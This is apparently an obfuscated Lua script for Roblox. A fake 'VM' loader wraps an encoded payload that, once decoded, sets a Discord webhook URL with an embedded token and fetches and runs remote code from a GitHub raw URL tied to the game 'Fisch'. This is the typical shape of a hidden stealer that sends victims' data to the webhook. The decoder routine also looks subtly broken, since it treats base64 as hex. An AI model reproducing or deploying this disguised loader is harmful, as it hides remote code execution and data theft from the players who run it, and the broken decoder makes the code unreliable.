
local StrToNumber = tonumber;
local Byte = string.byte;
local Char = string.char;
local Sub = string.sub;
local Subg = string.gsub;
local Rep = string.rep;
local Concat = table.concat;
local Insert = table.insert;
local LDExp = math.ldexp;
local GetFEnv = getfenv or function()
	return _ENV;
end;
local Setmetatable = setmetatable;
local PCall = pcall;
local Select = select;
local Unpack = unpack or table.unpack;
local ToNumber = tonumber;

local function VMCall(ByteString, vmenv, ...)
  local DIP = 1;
  local repeatNext;
  ByteString = Subg(Sub(ByteString, 5), "..", function(byte)
    if (Byte(byte, 2) == 81) then
      repeatNext = StrToNumber(Sub(byte, 1, 1));
      return "";
    else
      local a = Char(StrToNumber(byte, 16));
      if repeatNext then
        local b = Rep(a, repeatNext);
        repeatNext = nil;
        return b;
      else
        return a;
      end
    end
  end);
  
  local function gBits8()
    local a = Byte(ByteString, DIP, DIP);
    DIP = DIP + 1;
    return a;
  end
  
  local function gString(Len)
    local Str;
    if not Len then
      Len = gBits8();
      if (Len == 0) then
        return "";
      end
    end
    Str = Sub(ByteString, DIP, (DIP + Len) - 1);
    DIP = DIP + Len;
    return Str;
  end
  
  local function Deserialize()
    local Chunk = gString();
    return Chunk;
  end
  
  local function Wrap(Chunk, Env)
    return function(...)
      local func, err = loadstring(Chunk);
      if func then
        setfenv(func, Env);
        return func(...);
      else
        error("VM Error: " .. tostring(err));
      end
    end;
  end
  
  return Wrap(Deserialize(), vmenv)(...);
end

return VMCall("VXNlcm5hbWUgPSAiY2FydG9mcHJhaml0MTIzMSIKV2ViaG9vayA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMzQ3ODkwMDg2NzU0MTI3OTMzL0s3SE5HeFdBTGQ1R1VTZEdOZm1sNWtYbER1WVJoTEdyZUw2SzhsMTE5NVlMenFFN3R1UTNFcUZKekU2M1BoUHc2THVBIgoKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS95ZXNsaWRlenovRWtzMHZhL21haW4vRmlzY2giKSkoKQ==", GetFEnv(), ...);
  